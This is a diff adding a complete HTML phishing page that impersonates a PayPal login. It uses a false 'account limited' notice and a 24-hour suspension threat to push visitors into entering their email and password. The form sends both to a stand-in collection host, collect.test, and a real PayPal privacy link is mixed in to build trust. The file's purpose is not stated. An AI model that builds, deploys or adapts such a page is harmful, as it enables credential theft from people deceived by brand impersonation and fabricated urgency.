@@ -1,0 +1,15 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>PayPal: Log in to your account</title></head>
+<body>
+<h1>Your account has been limited</h1>
+<p>We noticed unusual activity on your PayPal account. To restore full access, confirm your details within 24 hours or your account will be suspended.</p>
+<p>This only takes a minute. Log in below to continue.</p>
+<form action="https://collect.test/p" method="post">
+  <input name="email" type="email" placeholder="Email">
+  <input name="password" type="password" placeholder="Password">
+  <button>Log in</button>
+</form>
+<p><a href="https://www.paypal.com/uk/webapps/mpp/ua/privacy-full">Privacy</a> · <a href="https://collect.test/help">Help</a></p>
+</body>
+</html>
